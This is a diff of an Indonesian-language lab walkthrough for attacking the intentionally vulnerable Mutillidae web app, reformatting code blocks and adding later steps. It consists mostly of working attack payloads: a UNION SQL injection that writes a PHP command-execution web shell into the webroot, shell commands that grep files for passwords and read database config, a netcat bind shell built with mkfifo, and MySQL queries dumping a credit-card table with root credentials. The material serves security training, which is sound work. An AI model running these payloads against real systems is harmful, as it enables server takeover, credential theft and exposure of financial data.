@@ -15,9 +15,9 @@
    - Pada bagian size, tambahkan kapasistasnya dari yg semula 20 menjadi 100
 3. Second Union SQL Injection Attempt
    - Pada kolom Textbox **Name** isikan 
-	```
-		' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/html/mutillidae/execute_command.php' -- 
-	```
+```
+	' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/html/mutillidae/execute_command.php' -- 
+```
    - Pastikan anda menambahkan spasi setelah karakter **`--`**
    - Klik tombol View Account Details
 4. Viewing the Results
@@ -41,25 +41,49 @@
    - Klik tombol Execute Command
 4. Network Reconnaissance
    - Ketikkan perintah berikut pada textbox
-	 ```netstat -nao | grep "0.0.0.0:"```
+```
+   netstat -nao | grep "0.0.0.0:"
+```
    - Klik tombol Execute Command
 
 ## Using the Backdoor for Database Reconnaissance
 1. Database Reconnaissance
    - Ketikkan perintah berikut pada textbox
-	 ```find * -name "*.php" | xargs grep -i "password" | grep "="```
+```
+   	find * -name "*.php" | xargs grep -i "password" | grep "="
+```
    - Klik tombol Execute Command
 2. View Database Authentication Attributes
-	   - Ketikkan perintah berikut pada textbox
-	 ```cat config.inc | grep -v "<?php"```
+   - Ketikkan perintah berikut pada textbox
+```
+   cat config.inc | grep -v "<?php"
+```
    - Klik tombol Execute Command
 
 ##  Using the Backdoor for Netcat Reconnaissance
 1. Netcat Reconnaissance
    - Ketikkan perintah berikut pada textbox
-	 ```which nc; netstat -nao | grep 4444 | wc -l```
+```
+   which nc; netstat -nao | grep 4444 | wc -l
+ ```
    - Klik tombol Execute Command
 2. Execute Netcat
    - Ketikkan perintah berikut pada textbox
-	 ```mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe```
+```
+   mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
+```
    - Klik tombol Execute Command
+3. On BackTrack, Start up a "another" terminal window
+	- Buka terminal lain pada kali linux
+4. Connect to Netcat
+   - Konek ke mutillidae menggunkan netcat
+   - Ketikkan perintah : `nc 10.0.1.100 4444`
+   - Ketikkan perintah : `hostname` untuk melihat hostname
+   - Ketikkan perintah : `whoami` untuk melihat user yang digunakan
+5. View Credit Card Information
+   - Pada terminal ketikkan printah-perintah berikut :
+```
+   echo "show databases;" | mysql -uroot -psamurai
+   echo "use nowasp; show tables;" | mysql -uroot -psamurai
+   echo "select * from nowasp.credit_cards;" | mysql -uroot -psamurai
+```
